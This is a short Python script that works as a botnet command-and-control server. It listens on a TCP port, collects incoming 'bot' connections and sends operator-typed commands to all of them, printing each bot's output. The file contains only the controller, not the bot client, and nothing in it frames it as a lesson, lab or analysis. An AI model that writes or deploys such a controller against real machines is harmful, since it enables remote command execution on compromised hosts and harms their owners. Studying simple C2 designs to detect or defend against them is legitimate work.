import socket
from threading import Thread

PORT = 9032

bot_connections = []

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('', PORT))
sock.listen()


def listen_for_new_bots():
    print("waiting for bots to connect...")
    while True:
        con, addr = sock.accept()
        print("got connection from ", addr[0], "-", str(addr[1]))
        bot_connections.append((con, addr))


listener = Thread(target=listen_for_new_bots, args=())
listener.start()

command = ""
while command.lower() != "exit":
    command = input("command: ")
    for bot in bot_connections:
        bot[0].send(command.encode())
        result = bot[0].recv(2048)
        print("\nresult from ", bot[1][0], " - ", str(bot[1][1]))
        print(result.decode())
